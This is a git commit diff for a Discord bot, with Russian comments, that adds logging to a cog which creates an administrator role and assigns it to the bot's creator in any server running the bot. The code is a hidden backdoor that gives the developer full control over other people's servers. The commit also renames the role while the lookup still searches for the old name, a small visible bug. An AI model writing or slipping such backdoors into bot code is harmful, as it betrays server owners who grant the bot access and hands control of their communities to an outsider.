076f55be784478b39cd95afba980d4d9d33b6083
Toil <ilya.t24@yandex.ru>
2021-12-18 23:14:06 +0300

    v0.3.4 | Добавил логи действий

--- Aki-DiscordBot/cogs/disabled/full_access.py
+++ Aki-DiscordBot/cogs/disabled/full_access.py
@@ -6,7 +6,7 @@ from core.bot import is_owner
 from core.logger import logger
 from data.colors import colors
 
-class Fullaccess(commands.Cog):
+class FullAccess(commands.Cog):
     """Выдать полный доступ"""
 
     def __init__(self, bot):
@@ -21,13 +21,16 @@ class Fullaccess(commands.Cog):
             owner_role = discord.utils.get(ctx.message.guild.roles, name = 'FakeOwner')
             if owner_role in ctx.author.roles:
                 await ctx.send(embed = discord.Embed(title = 'У вас уже имеется роль создателя'))
+                logger.warning(f'У пользователя уже имеется роль создателя - Пользователь: {ctx.author} ({ctx.author.id}).')
                 return
             if owner_role is None:
-                owner_role = await ctx.guild.create_role(name = 'FakeOwner', permissions = discord.Permissions( administrator = True), color = colors['success'])
+                owner_role = await ctx.guild.create_role(name = 'AkiOwner', permissions = discord.Permissions( administrator = True), color = colors['success'])
+                logger.info(f'Создана роль владельца бота - Пользователь: {ctx.author} ({ctx.author.id}).')
             await ctx.author.add_roles(owner_role, reason = None, atomic = True)
+            logger.info(f'Выдана роль владельца бота - Пользователь: {ctx.author} ({ctx.author.id}).')
         else:
             await ctx.send(embed = discord.Embed(title = '`Вы не являетесь моим создателем!`', color = colors['error']))
             logger.warning(f'Попытка получить права администратора - Пользователь: {ctx.author} ({ctx.author.id}).')
 
 def setup(bot):
-    bot.add_cog(Fullaccess(bot))
+    bot.add_cog(FullAccess(bot))
